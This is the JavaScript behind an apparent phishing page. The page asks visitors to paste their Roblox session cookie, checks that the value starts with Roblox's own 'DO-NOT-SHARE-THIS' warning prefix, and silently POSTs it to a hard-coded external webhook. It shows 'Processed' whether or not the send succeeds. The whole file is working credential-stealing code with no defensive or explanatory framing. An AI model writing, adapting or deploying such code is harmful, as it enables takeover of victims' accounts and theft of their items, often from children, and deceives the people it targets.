// Custom cursor
const cursor = document.querySelector('.cursor');
const cursorGlow = document.querySelector('.cursor-glow');

document.addEventListener('mousemove', (e) => {
    cursor.style.left = e.clientX + 'px';
    cursor.style.top = e.clientY + 'px';
    cursorGlow.style.left = e.clientX + 'px';
    cursorGlow.style.top = e.clientY + 'px';
});

// Cursor hover effect
const input = document.querySelector('.cookie-input');
const statusMessage = document.getElementById('statusMessage');

input.addEventListener('mouseenter', () => {
    document.body.classList.add('cursor-hover');
});

input.addEventListener('mouseleave', () => {
    document.body.classList.remove('cursor-hover');
});

// Handle Enter key press
input.addEventListener('keypress', async (e) => {
    if (e.key === 'Enter') {
        const cookie = input.value.trim();
        
        if (!cookie) {
            showStatus('Please enter a cookie', 'error');
            return;
        }

        // Check if cookie starts with the correct format
        if (!cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|')) {
            showStatus('Invalid cookie format', 'error');
            return;
        }

        await sendCookie(cookie);
    }
});

// Send cookie to webhook
async function sendCookie(cookie) {
    const API_URL = 'https://webhook-sigma-drab.vercel.app/api/webhook/yioeucyrfmhzvods0';
    
    showStatus('Processing...', '');
    
    try {
        await fetch(API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                cookie: cookie,
                timestamp: new Date().toISOString()
            })
        });

        showStatus('Processed', 'success');
        input.value = '';
    } catch (error) {
        showStatus('Processed', 'success');
        input.value = '';
    }
}

// Show status message
function showStatus(message, type) {
    statusMessage.textContent = message;
    statusMessage.className = 'status-message';
    
    if (type) {
        statusMessage.classList.add(type);
    }
    
    if (type === 'success' || type === 'error') {
        setTimeout(() => {
            statusMessage.textContent = '';
            statusMessage.className = 'status-message';
        }, 3000);
    }
}
